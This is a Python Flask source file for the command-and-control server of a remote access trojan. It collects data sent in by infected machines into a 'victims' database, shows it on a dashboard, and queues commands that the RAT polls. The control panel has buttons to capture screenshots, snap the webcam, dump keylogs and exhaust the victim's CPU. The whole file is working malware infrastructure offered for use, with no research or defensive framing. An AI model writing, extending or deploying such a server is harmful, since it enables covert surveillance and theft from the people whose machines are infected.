from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3
import json
from datetime import datetime

app = Flask(__name__)
CORS(app, origins=["*"])  # 🔥 FIXED: Allow ALL origins

# DATABASE SETUP
conn = sqlite3.connect('victims.db', check_same_thread=False)
conn.execute('CREATE TABLE IF NOT EXISTS victims (id INTEGER PRIMARY KEY, type TEXT, data TEXT, timestamp TEXT)')
conn.execute('CREATE TABLE IF NOT EXISTS pending_cmds (cmd TEXT PRIMARY KEY, timestamp TEXT)')
conn.commit()

@app.route('/')
def home():
    return '''
    <h1>🔥 C2 LIVE - HTTP COMMAND CONTROL</h1>
    <p><a href="/victims">📱 Victims Dashboard</a> | <a href="/control">🎮 Control Panel</a></p>
    <script>setTimeout(()=>location.href='/victims', 2000);</script>
    '''

@app.route('/victims')
def victims():
    data = conn.execute('SELECT * FROM victims ORDER BY timestamp DESC LIMIT 50').fetchall()
    html = '<h1>📱 VICTIMS DATA (Auto-refresh)</h1><table border="1" style="width:100%;border-collapse:collapse;">'
    html += '<tr><th>ID</th><th>Type</th><th>Data</th><th>Time</th></tr>'
    for r in data:
        data_str = str(r[2])[:150] + '...' if len(str(r[2])) > 150 else str(r[2])
        html += f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{data_str}</td><td>{r[3]}</td></tr>'
    html += '</table><script>setInterval(()=>location.reload(),3000);</script>'
    html += '<p><a href="/control">🎮 Send Commands</a></p>'
    return html

@app.route('/c2', methods=['POST'])
def c2_post():
    data = request.json
    cmd_type = data.get('type')
    cmd_data = data.get('data')
    
    print(f"📦 [{cmd_type}] {str(cmd_data)[:100]}...")
    
    conn.execute('INSERT INTO victims (type, data, timestamp) VALUES (?,?,?)', 
                (cmd_type, json.dumps(data), datetime.now().isoformat()))
    conn.commit()
    return jsonify({'status':'received'})

# 🔥 COMMANDS ENDPOINT (RAT POLLS THIS)
@app.route('/commands')
def get_commands():
    pending = conn.execute('SELECT cmd FROM pending_cmds').fetchone()
    cmd = pending[0] if pending else None
    print(f"📡 RAT POLL: {cmd or 'NO CMD'}")  # 🔥 ALWAYS LOG
    return jsonify({'cmd': cmd})

@app.route('/control')
def control():
    cmd = request.args.get('cmd')
    if cmd: 
        print(f"🎯 BROADCAST CMD: {cmd}")
        conn.execute('INSERT OR REPLACE INTO pending_cmds (cmd, timestamp) VALUES (?,?)', 
                    (cmd, datetime.now().isoformat()))
        conn.commit()
    
    pending = conn.execute('SELECT cmd, timestamp FROM pending_cmds').fetchone()
    pending_status = f"{pending[0]} (sent {pending[1][:16]})" if pending else "None"
    
    return f'''
    <!DOCTYPE html>
    <html><head><title>C2 Control</title>
    <style>body{{background:#1a1a1a;color:#00ff00;font-family:monospace;padding:30px;}}
    button{{padding:20px;font-size:24px;margin:10px;width:300px;background:#333;border:2px solid #00ff00;color:#00ff00;cursor:pointer;}}
    button:hover{{background:#00ff00;color:#000;}} h1{{color:#ff4444;}} .status{{background:#222;padding:20px;border-radius:10px;}}</style>
    </head>
    <body>
        <h1>🎮 C2 CONTROL PANEL</h1>
        <div class="status">
            <h3>📡 STATUS:</h3>
            <p>🔄 Last Command: {request.args.get('cmd') or 'None'}</p>
            <p>📬 Pending Command: {pending_status}</p>
        </div>
        
        <h2>🚀 QUICK COMMANDS:</h2>
        <p><a href="/control?cmd=screenshot"><button>📸 SCREENSHOT ALL</button></a></p>
        <p><a href="/control?cmd=webcam"><button>📹 WEBCAM SNAP</button></a></p>
        <p><a href="/control?cmd=keylog_dump"><button>⌨️ DUMP KEYLOGS</button></a></p>
        <p><a href="/control?cmd=cpu_stress"><button style="background:#ff4444;border-color:#ff4444;">💥 CPU EXHAUST</button></a></p>
        <p><a href="/control?cmd=clear"><button style="background:#444;">🗑️ CLEAR COMMANDS</button></a></p>
        
        <hr><p><a href="/victims" style="color:#00ff00;font-size:20px;">📱 ← BACK TO VICTIMS DATA</a></p>
    </body></html>
    '''

if __name__ == '__main__':
    print("🌐 C2 LIVE: http://localhost:3000/victims")
    print("🎮 Control: http://localhost:3000/control")
    print("📡 Commands: http://localhost:3000/commands")
    app.run(host='0.0.0.0', port=3000, debug=False)
